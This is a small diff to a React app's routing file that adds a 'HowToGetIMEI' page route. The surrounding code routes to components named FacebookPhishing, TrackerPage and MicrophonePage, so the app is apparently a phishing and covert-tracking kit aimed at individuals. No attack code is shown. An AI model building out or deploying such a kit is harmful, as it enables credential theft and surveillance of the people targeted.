@@ -5,6 +5,7 @@ import Dashboard from './components/Dashboard';
 import TrackerPage from './pages/TrackerPage';
 import FacebookPhishing from './pages/FacebookPhishing';
 import MicrophonePage from './pages/MicrophonePage';
+import HowToGetIMEI from './pages/HowToGetIMEI';
 import { BrowserRouter, Routes, Route, useParams } from 'react-router-dom';
 
 function WhatsAppChat() {
@@ -137,6 +138,7 @@ function App() {
         <Route path="/facebook/:id" element={<FacebookPhishing />} />
         <Route path="/microphone/:id" element={<MicrophonePage />} />
         <Route path="/whatsapp-chat/:number" element={<WhatsAppChat />} />
+        <Route path="/how-to-get-imei" element={<HowToGetIMEI />} />
       </Routes>
     </BrowserRouter>
   );
